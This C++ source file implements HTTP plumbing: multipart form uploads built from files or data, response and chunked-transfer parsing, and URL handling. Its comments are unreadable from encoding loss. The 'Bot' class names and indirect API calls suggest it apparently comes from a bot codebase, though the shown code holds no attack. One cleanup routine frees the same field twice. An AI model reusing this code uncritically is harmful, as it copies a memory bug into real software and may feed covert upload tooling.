			Result = STR::Length(Item->Header); // ������ ���������
			Result += 2; // ������ ������ ����� ������
			Result += Item->Size; // ������
			Result += 2 + STR::Length(Data->Boundary); // --Boundary
			if (IsLastItem)
				Result += 2; // ������� -- ����� Boundary
			Result += 2; // ������� ������ ����� ������
			return Result;
		}

		// ������ ������ ��������

        DWORD Max;

		if (Item->ReadState == mprsUnknown)
			Item->ReadState = mprsHeader;

		// ������ ���������
		if (Item->ReadState == mprsHeader)
		{
			Max = STR::Length(Item->Header) - Item->ReadedSize;
			if (Max > Size)
				Max = Size;
			CopyData(Item->Header +  Item->ReadedSize, Max, Buffer, Size);
			Result += Max;
			Item->ReadedSize += Max;
			if (Item->ReadedSize == STR::Length(Item->Header))
			{
                Item->ReadedSize = 0;
				Item->ReadState = mprsData;
			}
			else
				return Result;
		}

		// ������ ������
		if (Item->ReadState == mprsData)
		{
			bool IsFile = Item->FileHandle != NULL && Item->Data == NULL;


			Max = Item->Size - Item->ReadedSize;
			if (Max > Size)
				Max = Size;

			if (!IsFile)
				CopyData((LPBYTE)Item->Data + Item->ReadedSize, Max, Buffer, Size);
			else
			{
				// ������ ������ �� �����
				pReadFile(Item->FileHandle, Buffer, Max, &Max, NULL);
				Buffer += Max;
				Size -= Max;
            }

			Item->ReadedSize += Max;
			Result += Max;
			if (Item->ReadedSize == Item->Size)
			{
				Item->ReadState = mprsBoundary;
				Item->ReadedSize = 0;
            }
			else
				return Result;
        }

		// ������ Boundary
		if (Item->ReadState == mprsBoundary)
		{
			// �������� ������������� �������

			if (Item->Boundary == NULL)
			{
				PCHAR BNDEnd = NULL;

				if (IsLastItem)
					BNDEnd = BoundaryDelimeter;
				Item->Boundary = STR::New(5, LineBreak, BoundaryDelimeter, Data->Boundary, BNDEnd, LineBreak);
            }

			// ������ ������ �������
			Max = STR::Length(Item->Boundary) - Item->ReadedSize;
			if (Max > Size)
				Max = Size;

			CopyData(Item->Boundary + Item->ReadedSize, Max, Buffer, Size);


			Result += Max;
			Item->ReadedSize += Max;
			if (Item->ReadedSize == STR::Length(Item->Boundary))
			{
				Item->ReadedSize = 0;
				STR::Free2(Item->Boundary);
				Item->ReadState = mprsCompleted;
				if (Item->FileHandle != NULL)
				{
					pCloseHandle(Item->FileHandle);
					Item->FileHandle = NULL;
				}
            }
        }

        return Result;
    }

	//-----------------------------------------------------------------------
	DWORD TotalSize(PMultiPartData Data)
	{
		// ������� ���������� ����� ����� ������
		if (Data == NULL)
			return 0;

		DWORD Size = 0;
		DWORD Count = List::Count(Data->Items);
		// ���������� ������ ������
		for (DWORD i = 0; i < Count; i++)
        {
			PMultiPartItem  Item = (PMultiPartItem)List::GetItem(Data->Items, i);
            Size += ReadItem(Data, Item, NULL, 0, i == Count - 1);
		}

		return Size;

    }
}


void FreeMultipartItem(LPVOID Item)
{
	PMultiPartItem M = (PMultiPartItem)Item;

	STR::Free(M->Name);
	STR::Free(M->FileName);
	MemFree(M->Data);
	MemFree(M->FileName);
	MemFree(M->ContentType);
	STR::Free(M->Boundary);
	if (M->FileHandle != NULL)
		pCloseHandle(M->FileHandle);

	FreeStruct(M);
}

PMultiPartData MultiPartData::Create()
{
	// ������� ����� ������
	const static PCHAR Boundary = "---------";
	const BYTE MaxBnd = 16;
	PMultiPartData Data = CreateStruct(TMultiPartDataRec);
	if (Data == NULL)
		return NULL;

	Data->Items = List::Create();
	List::SetFreeItemMehod(Data->Items, FreeMultipartItem);

	PCHAR S  = Random::RandomString(MaxBnd, 'A', 'Z'); 
	Data->Boundary = STR::New(2, Boundary, S);
	STR::Free(S);

	return Data;
}

void MultiPartData::Free(PMultiPartData Data)
{
	// ���������� ����� ������
	if (Data == NULL)
		return;

	List::Free(Data->Items);
	STR::Free(Data->Boundary);
	FreeStruct(Data);
}


// �������� �������� ������
PMultiPartItem MultiPartData::AddBlobField(PMultiPartData Data, PCHAR Name, LPBYTE Value, DWORD ValueSize)
{
	if (Data == NULL || STR::IsEmpty(Name))
		return NULL;

	PMultiPartItem Item = CreateStruct(TMultiPartItem);
	if (Item == NULL)
		return  NULL;

	Item->Name = STR::New(Name);
	Item->Size = ValueSize;
	if (Item->Size != 0 && Value != NULL)
	{
		Item->Data = MemAlloc(Item->Size);
		m_memcpy(Item->Data, Value, Item->Size);
    }

    List::Add(Data->Items, Item);
	return Item;
}

PMultiPartItem MultiPartData::AddStringField(PMultiPartData Data, PCHAR Name, PCHAR Value)
{
    // �������� ��������� �������� � ������
	return AddBlobField(Data, Name, (LPBYTE)Value, StrCalcLength(Value));
}

// �������� ����
PMultiPartItem  MultiPartData::AddFileField(PMultiPartData Data, PCHAR Name,
										PCHAR FileName, PCHAR ContentType)
{
	// �������� �������� �������
	if (Data == NULL || STR::IsEmpty(Name) || STR::IsEmpty(FileName))
		return NULL;

	// �������� ������ �����
	HANDLE H = (HANDLE)pCreateFileA(FileName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

	if (H == INVALID_HANDLE_VALUE)
		return NULL;

	DWORD HS = 0;
    DWORD Size = (DWORD)pGetFileSize(H, &HS);


	// ��������� �������
	PMultiPartItem Item = AddBlobField(Data, Name, NULL, Size);
	if (Item == NULL)
	{
		pCloseHandle(H);
		return NULL;
	}

	Item->FileName    = STR::New(FileName);
	Item->FileHandle  = H;
	Item->ContentType = STR::New(ContentType);
	return Item;
}


// �������� �������� ������ ��� ����
PMultiPartItem MultiPartData::AddBlobAsFile(PMultiPartData Data, PCHAR Name, PCHAR FileName,
							 PCHAR ContentType, LPBYTE Value, DWORD ValueSize)
{
	if (Value == NULL || FileName == NULL)
		return NULL;

	PMultiPartItem Item = AddBlobField(Data, Name, Value, ValueSize);
	if (Item != NULL)
	{
		Item->FileName = STR::New(FileName);
		Item->ContentType = STR::New(ContentType);
    }

	return Item;
}


PMultiPartItem MultiPartData::AddLongAsStr(PMultiPartData Data, PCHAR Name, DWORD Value)
{
	// �������� ������� ����� ��� ������

	PCHAR S = StrLongToString(Value);

    PMultiPartItem R = AddStringField(Data, Name, S);

	STR::Free(S);

	return R;
}



DWORD MultiPartData::Read(PMultiPartData Data, LPBYTE Buffer, DWORD BufferSize)
{
	// ������� ������ ��������� ���� ������.
	// ��������� - ���������� ����������� ����
	// ���������� - ���� �� ���� �������� ������� �����, ��
	// ������� ������ ����� ������ ���� ������
	if (Buffer == NULL || BufferSize == 0)
		return MPDReader::TotalSize(Data);


	DWORD Result = 0;
	DWORD Count = List::Count(Data->Items);
	while(Data->ReadIndex < Count)
    {
		PMultiPartItem Item = (PMultiPartItem)List::GetItem(Data->Items, Data->ReadIndex);
		if (Item->ReadState == mprsCompleted)
		{
			Data->ReadIndex++;
			continue;
		}

		// ������ �������
		bool LastItem = Data->ReadIndex == Count - 1;
		DWORD Readed = MPDReader::ReadItem(Data, Item, Buffer, BufferSize, LastItem);
		if (Readed == 0) break;

		// ������ ������ ������ � ��������� �� �����
		Result += Readed;
		BufferSize -= Readed;
		Buffer += Readed;
		if (BufferSize == 0)
            break;
	}

	return Result;
}


LPBYTE MultiPartData::BuildToBuf(PMultiPartData Data, DWORD &ResultSize)
{
	// �������� ������ � ���� ������

	// ���������� ������ ������
	ResultSize = Read(Data, NULL, 0);
	if (ResultSize == 0)
		return NULL;

	// ������ ������
	LPBYTE Buf = (LPBYTE)MemAlloc(ResultSize + 1);
	if (Buf == NULL)
	{
        ResultSize = 0;
		return NULL;
	}
	ResultSize = Read(Data, Buf, ResultSize);
	*(Buf + ResultSize) = 0;
	return Buf;

}

//---------------------------------------------------------------------------
PHTTPResponseRec HTTPResponse::Create()
{
	// ������� ��������� ������
	PHTTPResponseRec R =CreateStruct(THTTPResponseRec);

    R->Headers = Strings::Create();

	return  R;
}
//---------------------------------------------------------------------------

void HTTPResponse::Clear(PHTTPResponseRec Response)
{
	// ������� ������� ��������� HTTP ������
	STR::Free2(Response->Protocol);
	STR::Free2(Response->ContentType);
	STR::Free2(Response->ResponseLine);
	STR::Free2(Response->Connection);
	STR::Free2(Response->Location);
	STR::Free2(Response->AcceptRanges);
	STR::Free2(Response->ResponseText);
	Strings::Free(Response->Headers);
	ClearStruct(*Response);

}
//---------------------------------------------------------------------------

void ParseContentRange(PHTTPResponseRec Response, PCHAR Value)
{
	//bytes 100-300/69652396
	if (!StrSame(Value, "bytes", false, 5))
		return;
	PCHAR Start = ScanLN(Value, ' ');
	IgnoreSpaces(Start);
	PCHAR End = ScanLN(Start, '-');
	if (End == NULL)
		return;
	*End = 0;
	Response->StartRange = StrToInt(Start);
	End++;
	Start = End;
	End = ScanLN(Start, '/');
	if (End == NULL)
		return;
	*End = 0;
	Response->EndRange = StrToInt(Start);
	End++;
	Start = End;
    Response->FullSize = StrToInt(Start);
}

void AddResponseValue(PHTTPResponseRec Response, PCHAR Name, PCHAR Value)
{
	Strings::AddValue(Response->Headers, Name, Value);


	switch (StrIndexOf(Name, false, 6, ParamContentType, ParamContentLength,
		ParamAcceptRanges, ParamConnection, ParamContentRange,
		ParamLocation))
	{
		case 0: Response->ContentType = STR::New(Value); break;
		case 1: Response->ContentLength = StrToInt(Value); break;
		case 2: Response->AcceptRanges = STR::New(Value); break;
		case 3: Response->Connection = STR::New(Value); break;
		case 4: ParseContentRange(Response, Value); break;
		case 5: Response->Location = STR::New(Value); break;
	}
}

bool HTTPResponse::Parse(PCHAR Buf, PHTTPResponseRec Response)
{
	// ������ ����� HTTP �������
	if (Buf == NULL || Response == NULL)
		return false;
	bool Result  = false;
	HTTPResponse::Clear(Response);
	Response->ResponseText = STR::New(Buf);

	PStrings S = Strings::Create();

	Strings::SetText(S, Buf);
	DWORD Count = Strings::Count(S);

	DWORD i;
	PCHAR Tmp;
	PCHAR Name;
	PCHAR Value;
	PCHAR Ptr;
	if (Count > 0)
	{
		// ��������� ������ ������
		if (HTTPParser::ParseResponseLine(Strings::GetItem(S, 0, false), Response->Protocol, Response->Code, Response->ResponseLine))
		{
			Result = true;
			for (i = 1; i < Count; i++)
			{
				Tmp = Strings::GetItem(S, i, false);
				Name = Tmp;
				Ptr = STR::Scan(Tmp, ':');
				if (Ptr == NULL) continue;
				*Ptr = 0;
				Ptr++;
				IgnoreSpaces(Ptr);
				Value = Ptr;
                AddResponseValue(Response, Name, Value);
			}
		}
    }

	Strings::Free(S);
	return Result;
}
//---------------------------------------------------------------------------

void HTTPResponse::Free(PHTTPResponseRec Response)
{
	// ������� ��������� ������
	if (Response == NULL)
		return;
	HTTPResponse::Clear(Response);
	FreeStruct(Response);
}

//*****************************************************************************
//  Chunks - ������ ��� ������ � ��������� ������ �������
//*****************************************************************************


PChunks Chunks::Initialize(PCHAR HTTPResponse)
{
	// ������� ��������� ��������� ������ � � ������ ����
	// ���� �������� ��������� Transfer-Encoding = chunked
	// ������ ��������� ��� ������ � ������������ �������
	if (STR::IsEmpty(HTTPResponse))
		return NULL;
	PCHAR Value = HTTPParser::GetHeaderValue(HTTPResponse, ParamTransferEncoding);
	if (Value == NULL || !StrSame(Value, ValueChunked, false))
		return NULL;

    return CreateStruct(TChunks);
}


LPBYTE Chunks::GetChunkSize(LPBYTE Buf, DWORD BufSize, DWORD &Size)
{
	// ������� ���������� ������ �����

	const static PCHAR EndChunk = "\r\n0\r\n\r\n";
	const static DWORD EndChunkSize = 7;

	Size = 0;

	// ��������� �� ��������� ������
	if (StrSame((PCHAR)Buf, EndChunk, true, EndChunkSize))
        return Buf + EndChunkSize;

	// �������� ������
	if (*Buf == 10 || *Buf == 13)
		Buf = (LPBYTE)STR::GotoNextLine((PCHAR)Buf, BufSize);

	PCHAR LN = STR::GetLine((PCHAR)Buf, BufSize);

	if (LN == NULL) return NULL;
	Size = STR::HexToDWORD(LN);
	STR::Free(LN);

	return (LPBYTE)STR::GotoNextLine((PCHAR)Buf, BufSize);
}

void Chunks::HandleDataBlock(PChunks Chunks, LPBYTE Data, DWORD &Size)
{
	// ���������� ���� ������
	if (Chunks == NULL || Data == NULL || Size == 0)
		return;

	DWORD Sz = Size;
	LPBYTE Buf = Data;
	while (Sz > 0 && !Chunks->Completed)
	{
		// �������� ������ �����
		if (Chunks->Size == 0)
		{
            // �������� ������ �����
			LPBYTE SzEnd = GetChunkSize(Buf, Sz, Chunks->Size);
			if (SzEnd != NULL)
			{
				DWORD HeadSize = SzEnd - Buf;
				// ������� ���������� � ������� �� ������
                STR::Delete((PCHAR)Buf, 0, HeadSize, Sz);

				Sz -= HeadSize;
				Size -= HeadSize;
            }

			if (SzEnd == NULL || Chunks->Size == 0)
			{
				Chunks->Completed = true;
				break;
            }
		}

		// ���������� ����
		DWORD NeedRead = Chunks->Size - Chunks->Readed;
		if ( NeedRead <= Sz)
		{
			Chunks->Readed += NeedRead;
			Sz -= NeedRead;
			Buf += NeedRead;
			// ���� ��������� ��������
			if (Chunks->Readed == Chunks->Size)
			{
				Chunks->Readed = 0;
                Chunks->Size = 0;
            }
		}
		else
		{
			// ���� ������ �������� �� ���� ������������ �����
			Chunks->Readed += Sz;
			break;
        }

    }

}



void Chunks::Free(PChunks Chunks)
{
	// ������� ���������� ���������
	if (Chunks != NULL)
    	FreeStruct(Chunks);
}


//---------------------------------------------------------------------------

//*****************************************************************************
//  HTTPParser - ������ HTTP ������
//*****************************************************************************
bool HTTPParser::ParseResponseLine(PCHAR Buf, PCHAR &Protocol, DWORD &Code, PCHAR &StatusLine)
{
	// ������ ������ ������ HTTP �������
	// �������� HTTP/1.1 200 Ok
	Protocol = NULL;
	Code = 0;
	StatusLine = NULL;

	if (Buf == NULL)
		return false;
	if (!StrSame(Buf, "HTTP/1.", false, 7))
		return false;

	PCHAR Start = Buf;
	PCHAR End = Start;

	// ���������� ��������
	End = ScanLN(Buf, ' ');
	if (End == NULL)
		return false;
	Protocol = STR::New(Start, End - Start);

	// ���������� ���
	Start = End;
	IgnoreSpaces(Start);
	End = ScanLN(Start, ' ');
	PCHAR Tmp = STR::New(Start, End - Start);
    Code = (DWORD)StrToInt(Tmp);
	STR::Free(Tmp);

	// ���������� ������ ������
	Start = End;
	IgnoreSpaces(Start);
	End = STR::End(Start);
	StatusLine = STR::New(Start, End - Start);

	return Protocol != NULL && Code != 0;

}
//---------------------------------------------------------------------------

//*****************************************************************************
// ������ ��� ������ � HTTP �������
//*****************************************************************************
PCHAR HTTPUtils::DeleteHeaderValue(PCHAR Buf, int &Size, PCHAR Header)
{
	// ������� ��������� HTTP ���������
	if (STR::IsEmpty(Buf) || STR::IsEmpty(Header)) return Buf;
	if (Size == 0)
		Size = StrCalcLength(Buf);

	int Pos = STR::Pos(Buf, Header);
	if (Pos < 0) return Buf;
	PCHAR Start = Buf + Pos;
	while (*Start != 0 && *Start != ':') Start++;
	Start++;
		
	PCHAR End = Start;

	// ��������� �� ��������� ������
	while (*End != 0 && *End != 10 && *End != 13) End++;

	DWORD Delta = End - Start;
    DWORD CopySize = Size - (End - Buf);
    m_memcpy(Start, End, CopySize);

	Size -= Delta;
	*(Buf + Size) = 0;
    return Buf;

}


// ***************************************************************************
// 								TURL
// ***************************************************************************


TURL::TURL(const char * aURL)
{
	Port = HTTPPort;
	if (aURL)
    	DoParse(aURL);
}
//----------------------------------------------------------------------------

void TURL::NormalizePath()
{
	// ������� �������� ���� � ����������� �������
	if (Path.IsEmpty())
		Path = HTTPSlash;
	else
	{
    	// ��������� ��������� � �������� ����
		if (Path[0] != *HTTPSlash)
			Path.Insert(HTTPSlash, 0);

	   	if (!Document.IsEmpty())
		{
			if (Path[Path.Length() - 1] != *HTTPSlash)
				Path += HTTPSlash;
        }
    }
}
//----------------------------------------------------------------------------


string TURL::URL()
{
	// ������� ������� ������ �����

	if (Host.IsEmpty())
		return NULLSTR;

    // �������������� ����������� ������
	if (Protocol.IsEmpty())
		Protocol = ProtocolHTTP;

	// �������� ���� � ������� �������
	NormalizePath();

	// ����������� ����� �����
	DWORD Len = Protocol.Length() + 3 +
				Host.Length() +
				Path.Length() +
				Document.Length() +
				Params.Length() + 2;


    // �������� ������
	string R(Len);

	R += Protocol;
	R += HTTPProtocolDelimeter;
	R += Host;
	R += Path;
	R += Document;

	if (!Params.IsEmpty())
	{
		R += HTTPParamsDelimeter;
		R += Params;
    }

	return R;
}
//----------------------------------------------------------------------------

// ������� �������� ������ ��� ��������� ������ � ���� �������
string TURL::GetPathAndDocument()
{
	NormalizePath();
	string Result = Path + Document;
	// ��������� ���������
	if (!Params.IsEmpty())
	{
		Result += HTTPParamsDelimeter;
		Result += Params;
	}
	return Result;
}
//----------------------------------------------------------------------------

void TURL::Clear()
{
	Protocol.Clear();
	Host.Clear();
	Path.Clear();
	Document.Clear();
	Params.Clear();
	Port = HTTPPort;
}
//----------------------------------------------------------------------------

bool TURL::Parse(const char *URL)
{
	Clear();
    return DoParse(URL);
}
//----------------------------------------------------------------------------


bool TURL::DoParse(const char *URL)
{
	// ������� ��������� ����� �� ������������

	if (URL == NULL)
		return false;

	Port = 0;

	int Pos = STR::Pos(URL, HTTPProtocolDelimeter);
	if (Pos >= 0)
	{
		// ����������� ������
		Protocol.Copy(URL, 0, Pos);
		URL += Pos + STRA::Length(HTTPProtocolDelimeter);
	}
	else
		Protocol = ProtocolHTTP;


	Protocol.LowerCase();

	// ��������� ���� � ���� � ������

	/* TODO : ������� �������� ������� ������ ����� � ������ */

    // ������������� ����
	if (!Port)
	{
		if (Protocol == ProtocolHTTP)
			Port = HTTPPort;
		else
		if (Protocol == ProtocolHTTPS)
			Port = HTTPSPort;
    }



	// ���������� ������� ������ ����
	Pos = STR::Pos(URL, HTTPSlash);

	if (Pos < 0)
	{
		// ����� �� �������� ����
		if (STR::Scan(URL, '.') == NULL) return false;
		Host = URL;
		return true;
	}

	// ��������� ���� � ���������� ��������� �� ������ ����
	Host.Copy(URL, 0, Pos);
	URL += Pos;

	// ��������� ������ �������� ���� ������
	string DocAndPath;

	Pos = STR::Pos(URL, HTTPParamsDelimeter);
	if (Pos >= 0)
	{
		// ��������� ���������
		Params = URL + Pos + 1;
	}
	else
        Pos = AnsiStr::Length(URL);


	// ��������� ���� � �������
	const char* DocPtr = URL + Pos;

	// ��������� � ������ ����� ���������
	while (DocPtr > URL && *DocPtr != *HTTPSlash) DocPtr--;
	DocPtr++;

	// �������� ��� ���������
    DWORD DocLen = Pos - (DocPtr - URL);
	Document.Copy(DocPtr, 0, DocLen);

	// ��������
	Path.Copy(URL, 0, DocPtr - URL);

	return !Host.IsEmpty();
}

//----------------------------------------------------------------------------

// ***************************************************************************
//                            THTTPRequest
// ***************************************************************************
THTTPRequest::THTTPRequest()
{
	Port = HTTPPort;
	Protocol   = HTTP_1_1;
	Method     = hmGET;
	Accept     = DefaultAccept;
	CloseConnection = true;
	ContentLength = 0;
}


void THTTPRequest::SetURL(const char* aURL)
{
	TURL URL(aURL);
	ProtocolStr = URL.Protocol;
	Host        = URL.Host;
	Path        = URL.GetPathAndDocument();
	Port        = URL.Port;
}
//---------------------------------------------------------------------------


//-----------------------------------------------------
//  ������� ��������� ��������� HTTP �������.
//  Post ������ � ��������� �� �����������
//-----------------------------------------------------
string THTTPRequest::MakeRequestHeaders()
{
	if (Path.IsEmpty()) Path = HTTPSlash;


	DWORD Len = Path.Length() + 128;

    string Buf(Len);
	// ��������� ��������� ������

	// ���������� ����� �������
	switch (Method) {
		case hmPOST: Buf += HTTPMethodPOST; break;
		case hmHEAD: Buf += HTTPMethodHEAD; break;
    default:
        Buf += HTTPMethodGET;
	}

	// ���������� �����
	Buf += HTTPSpace;
	Buf += Path;

	// ���������� ������ ���������
	Buf += HTTPSpace;
	switch (Protocol) {
		case HTTP_1_0: Buf += HTTPProtocolVersion_1_0; break;
		case HTTP_1_1: Buf += HTTPProtocolVersion_1_1; break;
	}

	Buf += LineBreak;


	// ��������� ��� ���������
    Buf += MakeHeaders();

	// ���������� ���������
    return Buf;
}
//---------------------------------------------------------------------------

void THTTPRequest::AddHeader(string &Buf, const char *Name, const char *Value, bool CheckValue)
{
	if (!STRA::IsEmpty(Name) && (!CheckValue || !STRA::IsEmpty(Value)))
	{
		Buf += Name;
		Buf += ValueDelimeter;
		Buf += Value;
        Buf += LineBreak;
    }
}

void THTTPRequest::AddHeader(string &Buf, const char *Name, const string &Value, bool CheckValue)
{
    AddHeader(Buf, Name, Value.t_str(), CheckValue);
}

//---------------------------------------------------------------------------


string THTTPRequest::MakeHeaders()
{
	string Buf(2048);

	AddHeader(Buf, ParamAccept, Accept);
	AddHeader(Buf, ParamUserAgent, GetUserAgent());
	AddHeader(Buf, ParamReferer, Referer);
	AddHeader(Buf, ParamHost, Host);

	// ��������� �������� �������� ����������
	PCHAR Value = (CloseConnection) ? HTTPConnectionClose :
								      HTTPConnectionKeepAlive;
    AddHeader(Buf, ParamConnection, Value);


	//���������� ��� ����������� ������������ ������
	AddHeader(Buf, ParamAcceptEncoding, AcceptEncoding, false);

	// ���������� ���������� � ���� ������
	if (Method == hmPOST)
	{
		AddHeader(Buf, ParamContentLength, LongToStr(ContentLength));
		AddHeader(Buf, ParamContentType, ContentType);
	}

	// ��������� ������ ������ � �����
    Buf += LineBreak;

	return Buf;
}
//---------------------------------------------------------------------------


string THTTPRequest::GetUserAgent()
{
	// �������, ��� �������������, �������� ��� ������ ������������� �
	// ������� �� ���������
	if (UserAgent.IsEmpty())
	{
		DWORD BufSize = 1024;
		TMemory Buf(BufSize);

		pObtainUserAgentString(0, Buf.Buf(), &BufSize);
        UserAgent = Buf.AsStr();
	}

	return UserAgent;
}
//---------------------------------------------------------------------------



// ***************************************************************************
// 								THTTPResponse
// ***************************************************************************

THTTPResponse::THTTPResponse()
{

}

THTTPResponse::~THTTPResponse()
{
	Chunked = false;
	Code = 0;
}


//---------------------------------------------------
//	AddData - ������� ��������� ������ ����������
//  �� ������� ������.
//  Buf - ��������� �� ����� � �������. �����
//        ��������� ����� ��������� �� ������
//        ����� ���������
//  BufSize - ������ ����������� ������. �����
//            ��������� ����� ��������� ������
//            ���������� � ������ ������
//
//  ���������: ������� ������ ������ ���� ���������
//             �������� ���������
//---------------------------------------------------
bool THTTPResponse::AddData(PCHAR &Buf, int &BufSize)
{
	/* TODO : �������������� ������ ��������� */
	if (FHTTPData.IsEmpty())
		Clear();

	int Pos = STRA::Pos(Buf, LineBreak2);

	DWORD Len = (Pos >= 0) ? Pos + STRA::Length(LineBreak2) : BufSize;

	// �������� ��������
	string Tmp(Buf, Len);

	if (FHTTPData.IsEmpty())
		FHTTPData = Tmp;
	else
	{
		FHTTPData += Tmp;
		if (Pos < 0)
            Pos = FHTTPData.Pos(LineBreak2);
			
    }

	// ������ �������� ������
	Buf     += Len;
	BufSize -= Len;

	bool Result = Pos >= 0;

	// � ������ ���� ��������� ������� ��������� ������������ ���
	if (Result)
		Parse();

	return  Result;
}
//----------------------------------------------------------------------------


void THTTPResponse::Clear()
{
	// ������� ������� ����� ������
	Headers.Clear();
	Protocol.Clear();
	StatusLine.Clear();
	ContentType.Clear();
	CacheControl.Clear();
	Location.Clear();
	Pragma.Clear();
	TransferEncoding.Clear();
	ContentLength = -1;
	Chunked = false;
	Code = 0;
}
//----------------------------------------------------------------------------

bool THTTPResponse::ParseFirstLine(const char* Line)
{
    // ������� ��������� ������ ������ ������
	if (STRA::IsEmpty(Line) || !StrSame((PCHAR)Line, "HTTP/", false, 5))
		return false;


	PCHAR Start = (PCHAR)Line;
	PCHAR End;

	// ���������� ��������
	End = ScanLN(Start, ' ');
	if (End == NULL)
		return false;
	Protocol.Copy(Start, 0, End - Start);

	// ���������� ���
	Start = End;
	IgnoreSpaces(Start);
	End = ScanLN(Start, ' ');
	if (!End) End = Start;
	string Tmp(Start, End - Start);
    Code = StrToInt(Tmp.t_str());


	// ���������� ������ ������
	Start = End;
	IgnoreSpaces(Start);
	StatusLine = Start;

	return !Protocol.IsEmpty() && Code != 0;

}
//----------------------------------------------------------------------------

void THTTPResponse::Parse()
{
	// ������� ������������ ���������� ���������
	Headers.SetText(FHTTPData.t_str());

	// ������� �����
	FHTTPData.Clear();


    // ��������� ������ ������
	string FirstLine = Headers[0];

	// ��������� ���������
	if (!ParseFirstLine(FirstLine.t_str()))
		return;


	// ���������� ��� �� ������ ����� ����������� ��������
	// Header: Value
	// Header:Value
	PCHAR Delimeter = ValueDelimeter;

	for (int i = 1; i < Headers.Count(); i++)
	{
		string L = Headers[i];
		PCHAR P = STRA::Scan(L.t_str(), ':');
		if (P && *(++P))
		{
			if (*P != ' ')
				Delimeter = ":";
			break;
        }
	}

	Headers.ValueDelimeter = Delimeter;

	// �������� �������� �������� ����������
	ContentType      = Headers.GetValue(ParamContentType);
	CacheControl     = Headers.GetValue(ParamCacheControl);
	Pragma           = Headers.GetValue(ParamPragma);
	TransferEncoding = Headers.GetValue(ParamTransferEncoding);
	MD5              = Headers.GetValue(ParamContentMD5);

	// ��������� �������� ���������
	Location = Headers.GetValue(ParamLocation);
	if (!Location.IsEmpty() && FRequest && Location[0] == '/')
	{
		// ������������� ���� ���������� � ������
		TURL URL;
		URL.Protocol = FRequest->ProtocolStr;
		URL.Host     = FRequest->Host;
		URL.Path     = Location;

		Location = URL.URL();
	}


	// ���������� ���������� �������� ��������
	Chunked = TransferEncoding == ValueChunked;

	// ���������� ����� ������
	string Tmp = Headers.GetValue(ParamContentLength);
	if (!Tmp.IsEmpty())
		ContentLength = StrToInt(Tmp.t_str());
	else
    	ContentLength = -1;
}
//----------------------------------------------------------------------------


// ***************************************************************************
// 								    THTTPChunks
// ***************************************************************************

THTTPChunks::THTTPChunks(THTTP* Owner, TBotStream* Stream)
{
	FOwner = Owner;
    Initialize(Stream);
}
//-------------------------------------------------

void THTTPChunks::Initialize(TBotStream* Stream)
{
	FStream = Stream;
	FSize   = 0;
	FState  = Unknown;
	FIgnoreSize = 0;
	FLastBlock = false;
	FCompleted = false;
	FSizeBuf.Clear();
}
//-------------------------------------------------

void THTTPChunks::Write(PCHAR Buf, int BufSize)
{
	// ������� ���������� ���� ������ � ������ ���������� � ��� �������
	if (!FOwner || !FStream) return;

	while (BufSize && !FCompleted)
	{

		// ���������� ������ �������� �����
		if (FState == Unknown)
		{
			if (!GetSize(Buf, BufSize))
			{
				// �� ������� ���������� ������ �����, ������
				// ��������� �� ��� ������. ��� ���������
				// ������
                break;
            }
		}


		// ���������� ��������� ������
		if (FState == IgnoreSizeEnd || FState == IgnoreBlockEnd)
		if (!Ignore(Buf, BufSize))
		{
			// ���� �� �������� ������������ ���������� ������
			// ��� ��������� ������
            break;
		}

		// ���������� ������
		if (FState == WriteData)
			WriteChunk(Buf, BufSize);
    }

	if (FCompleted)
        FOwner->FDocumentCompleted = FCompleted;
}
//-------------------------------------------------

bool THTTPChunks::GetSize(PCHAR &Buf, int &Size)
{
	// ������� ���������� ������ �������� ����� � �������
	// ��������� �� ������ ������
	FSize = -1;

	PCHAR End = Buf;

	// ��������� � �������� ����� ������
	while (Size && *End != 10 && *End != 13)
	{
		End++;
		Size--;
    }

	bool Valid = Size > 0;

	*End = 0;
	FSizeBuf += Buf;

	if (Valid)
	{
		FSize = STR::HexToDWORD(FSizeBuf.t_str());
		FSizeBuf.Clear();

		if (FSize == 0)
			FLastBlock = true;

		// ������� ���������
        Buf = End;

		// ��������� � ��������� ������������� 2 ����
		// (����� ������� ��� ���� \r\n)
		FState      = IgnoreSizeEnd;
		FIgnoreSize = 2;
    }

	return Valid;
}
//-------------------------------------------------

bool THTTPChunks::Ignore(PCHAR &Buf, int &Size)
{
	// ���������� ������ ������
    int ToIgnore = Min(FIgnoreSize, Size);

	FIgnoreSize -= ToIgnore;
	Size        -= ToIgnore;
    Buf         += ToIgnore;

	if (FIgnoreSize == 0)
	{
		if (FState == IgnoreSizeEnd)
			FState = WriteData;
		else
		{
			// ���������� ��������� �����
			FState = Unknown;
			if (FLastBlock)
            	FCompleted = true;
        }
	}

	return FIgnoreSize == 0;
}
//-------------------------------------------------

void THTTPChunks::WriteChunk(PCHAR &Buf, int &Size)
{
	// ������� ���������� ������ ������ ������
	int ToWrite = Min(FSize, Size);

	if (ToWrite)
	{
		FOwner->WriteReceivedData(FStream, Buf, ToWrite);
		Buf   += ToWrite;
		Size  -= ToWrite;
		FSize -= ToWrite;
	}

	if (FSize == 0)
	{
		// ����� ����� ������ ���� ���� �������� \r\n
        FIgnoreSize = 2;
		FState = IgnoreBlockEnd;
	}
}
//-------------------------------------------------

bool THTTPChunks::Completed()
{
	return FCompleted;
}
//-------------------------------------------------





// ***************************************************************************
// 								TMultiPartDataItem
// ***************************************************************************
TMultiPartDataItem::TMultiPartDataItem(TBotCollection* Owner)
    : TBotCollectionItem(Owner)
{
	FData = NULL;
	FSize = 0;
	FFile = 0;
}

TMultiPartDataItem::TMultiPartDataItem(TBotCollection* Owner, LPVOID Data, DWORD DataSize)
	: TBotCollectionItem(Owner)
{
	FData = NULL;
	FSize = 0;
    SetData(Data, DataSize);
}
//-----------------------------------------------------------

TMultiPartDataItem::~TMultiPartDataItem()
{
	if (FData) MemFree(FData);
	if (FFile) delete FFile;

}
//-----------------------------------------------------------

void TMultiPartDataItem::SetData(LPVOID Data, DWORD DataSize)
{
	// ������� ������������� ������ ��������
	if (FData)
	{
		MemFree(FData);
		FData = NULL;
		FSize = 0;
	}

	if (Data && DataSize)
	{
		FData = MemAlloc(DataSize);
		if (FData)
		{
			FSize = DataSize;
			m_memcpy(FData, Data, DataSize);
		}
	}
}

//-----------------------------------------------------------

void TMultiPartDataItem::MakeHeader()
{
	// ������� ���������� ��������� �����
	if (!FBlockHeader.IsEmpty()) return;


	FBlockHeader = GetStr(HTTPFormContentDisposition);

	string Name;
	Name.Format(GetStr(HTTPFormFieldName).t_str(), FName.t_str());

	FBlockHeader += Name;

